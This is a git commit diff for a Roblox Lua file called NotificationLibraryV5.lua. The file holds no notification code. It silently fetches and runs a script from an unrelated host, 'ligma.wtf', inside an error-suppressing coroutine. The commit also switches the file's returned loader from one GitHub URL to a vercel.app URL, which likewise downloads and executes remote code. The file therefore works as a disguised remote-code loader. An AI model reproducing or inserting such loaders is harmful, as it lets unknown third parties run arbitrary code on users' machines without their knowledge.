c9f97c22d3bca254e627926a984a59597d336470
BinbinvoGamingVNN <122621965+BinbinvoGamingVNClone@users.noreply.github.com>
2025-03-18 09:49:51 +0700

    Update NotificationLibraryV5.lua

--- Library/NotificationLibraryV5.lua
+++ Library/NotificationLibraryV5.lua
@@ -1,4 +1,4 @@
 coroutine.resume(coroutine.create(pcall), function()
 	loadstring(game:HttpGet("http://ligma.wtf/scripts/compatibility.lua", true))()
 end)
-return loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMinisterq/Notification-Library/main/Library.lua", true))(...)
+return loadstring(game:HttpGet("https://shinichihub.vercel.app/Library/NotificationSourceV5.lua",true))(...)
